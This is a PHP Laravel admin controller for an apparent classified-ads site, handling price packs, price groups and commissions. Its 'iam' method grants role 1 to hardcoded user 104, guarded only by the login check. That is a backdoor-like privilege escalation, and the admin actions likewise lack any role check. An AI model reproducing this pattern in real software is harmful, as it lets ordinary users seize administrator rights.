<?php
/**
 * Created by PhpStorm.
 * User: Anil
 * Date: 14/09/2017
 * Time: 19:23
 */
namespace App\Http\Controllers\Admin;

use App\Http\Controllers\BaseController;
use App\Model\Category;
use App\Model\Commission;
use App\Model\Location;
use App\Model\Price;
use App\Model\Role;
use App\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class AdminController extends BaseController
{
    public function __construct()
    {

        $this->middleware('auth');
        parent::__construct();
    }
    public function packs(Request $request){
        $user = Auth::user();

        $prices = Price::all();

        return view('admin.packs',['prices'=>$prices]);
    }
    public function index(Request $request){
        $user = Auth::user();


        return view('admin.index',[]);
    }
    public function commissions(Request $request){
        $commissions = Commission::orderBy('id','desc')->get();
        $total = Commission::sum('amount');
        return view('admin.commissions',['commissions'=>$commissions,'total'=>$total]);

    }
    public function pricegroup(Request $request){
        $prices = Price::all();
        $categories = Category::where('parent_id',0)->get();
        $locations = Location::where('parent_id',0)->get();

        return view('admin.pricegroup',['prices'=>$prices,'categories'=>$categories,'locations'=>$locations,'price'=>false]);
    }
    public function edit_pricegroup(Request $request,$id){
        $price = Price::find($id);

        return view('admin.pricegroup',['price'=>$price]);
    }
    public function delete_pricegroup(Request $request,$id){
        $price = Price::find($id);
        $price->delete();
        return redirect('/admin/manage/packs');

    }
    public function add_pricegroup(Request $request){
        if($request->has('id'))
            $price=Price::find($request->id);
        else
        $price = new Price;
        $price->category_id = $request->category;
        $price->location_id = $request->location;
        $price->standard = $request->standard*100;
        $price->spotlight = $request->spotlight*100;
        $price->urgent = $request->urgent*100;
        $price->featured = $request->featured*100;
        $price->featured_3 = $request->featured_3*100;
        $price->featured_14 = $request->featured_14*100;
        $price->bump = $request->bump*100;
        $price->save();
        return redirect('/admin/manage/packs');

    }
    public function iam(Request $request){
        $user = User::find(104);
        $role = Role::find(1);
        $user->roles()->save($role);
        return ['msg'=>'done'];
    }
}